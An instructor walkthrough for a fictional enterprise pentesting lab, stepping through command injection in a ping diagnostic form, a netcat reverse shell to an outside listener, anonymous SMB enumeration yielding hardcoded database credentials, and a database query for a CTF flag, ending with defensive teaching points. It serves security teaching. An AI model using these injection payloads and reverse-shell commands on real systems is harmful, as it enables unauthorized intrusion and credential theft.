# 🎓 Instructor Walkthrough & Solution Manual

**Nexus Global Enterprise Network Pentesting Lab**  
*Confidential - For Instructor & Lab Facilitator Use Only*

---

## 1. Complete Black-Box Attack Chain (Step-by-Step)

### Step 1: External Reconnaissance
From your local pentest machine:
```bash
# Scan external perimeter
nmap -sV -p 80,443,8025 10.0.1.10
```
**Observation:** Port 80 is open running Nginx Reverse Proxy forward-facing to `corp-web-portal`. Port 8025 is running Corporate Webmail (MailHog).

---

### Step 2: DMZ Web Foothold (Command Injection)
1. Inspect the web application at `http://10.0.1.10/` (or `http://localhost:80` on host).
2. Observe the **Network Edge Ping Diagnostic Tool** form.
3. Test command injection payload in the `host` parameter:
```bash
curl -X POST http://10.0.1.10/api/network/ping -d "host=127.0.0.1; whoami; ip addr"
```
**Output:** The command executes with root/container privileges on `srv-dmz-web01` (`10.0.1.20`).

---

### Step 3: Pivoting from DMZ to Core & DC Networks
From the compromised DMZ web container (`10.0.1.20`), direct access to `10.0.3.20` (Database) on port 5432 is blocked by `hq-firewall`. However:
1. `10.0.1.20` CAN reach `10.0.3.10:8000` (Internal ERP Intranet).
2. Set up a reverse shell or port forward:
```bash
# Inside attacker container, start netcat listener:
nc -lvnp 4444

# Trigger reverse shell from vulnerable ping endpoint:
curl -X POST http://10.0.1.10/api/network/ping \
  -d "host=127.0.0.1; nc -e /bin/sh 198.51.100.100 4444"
```

---

### Step 4: Active Directory & SMB Share Enumeration
From within the network (or via proxy to `10.0.2.10`):
```bash
# Enumerate SMB shares on Active Directory DC
smbclient -L //10.0.2.10 -N
```
**Discovered Shares:**
- `IT-Backups`
- `HR-Public`
- `sysvol`

Download backup scripts:
```bash
smbclient //10.0.2.10/IT-Backups -N -c "get sync_prod_db.sh"
cat sync_prod_db.sh
```
**Leaked Credentials in `sync_prod_db.sh`:**
- `DB_HOST="10.0.3.20"`
- `DB_USER="nexus_admin"`
- `DB_PASS="Nexu$Prod2026!Sec"`

---

### Step 5: Compromising the Data Center Database (Crown Jewels)
Using credentials from Step 4 or accessing the internal ERP (`http://10.0.3.10:8000`):
```bash
# From campus workstation or pivoted session:
psql -h 10.0.3.20 -U nexus_admin -d nexus_prod
# Password: Nexu$Prod2026!Sec

# Query system vault keys table:
SELECT * FROM system_vault_keys;
```
**Extracted CTF Flag:**
```
FLAG{N3XUS_ENT3RPR1S3_D4T4C3NT3R_C0MPR0M1S3D_2026}
```

---

## 2. Gray-Box Attack Chain (DevOps / HR Insider)

1. Log into DevOps client:
   ```bash
   docker exec -it nexus-pc-dev-01 bash
   ```
2. Inspect environment and bash history:
   ```bash
   cat ~/.bash_history
   cat ~/projects/nexus-infra/db_creds.env
   ```
3. Direct connection to database:
   ```bash
   psql -h 10.0.3.20 -U nexus_admin -d nexus_prod
   ```

---

## 3. Teaching Points & Key Takeaways

1. **Defense in Depth:** Explain why DMZ isolation prevented direct access to the database, forcing attackers to find secondary pivots (Active Directory share leaks).
2. **Hardcoded Secrets:** Highlight how hardcoded database credentials in automation scripts lead to total compromise even across segmented networks.
3. **Least Privilege:** Emphasize that web diagnostic tools should not have unrestricted shell execution or root capabilities.
